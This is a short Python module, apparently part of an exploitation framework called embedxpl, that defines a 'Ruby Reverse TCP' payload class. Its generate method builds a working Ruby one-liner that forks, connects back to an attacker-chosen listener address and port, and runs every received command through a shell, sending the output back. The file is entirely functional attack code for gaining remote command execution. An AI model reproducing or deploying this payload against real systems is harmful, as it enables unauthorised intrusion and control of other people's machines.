"""Ruby Reverse TCP Shell."""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "Ruby Reverse TCP",
        "description": "Ruby one-liner reverse TCP shell.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }

    options = {
        "LHOST": {"description": "Listener IP", "required": True, "default": "", "value": ""},
        "LPORT": {"description": "Listener port", "required": True, "default": "4444", "value": "4444"},
    }

    def generate(self) -> bytes:
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]
        ruby = (
            f"require 'socket';"
            f"exit if fork;"
            f"c=TCPSocket.new('{lhost}',{lport});"
            "while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end"
        )
        return ruby.encode()
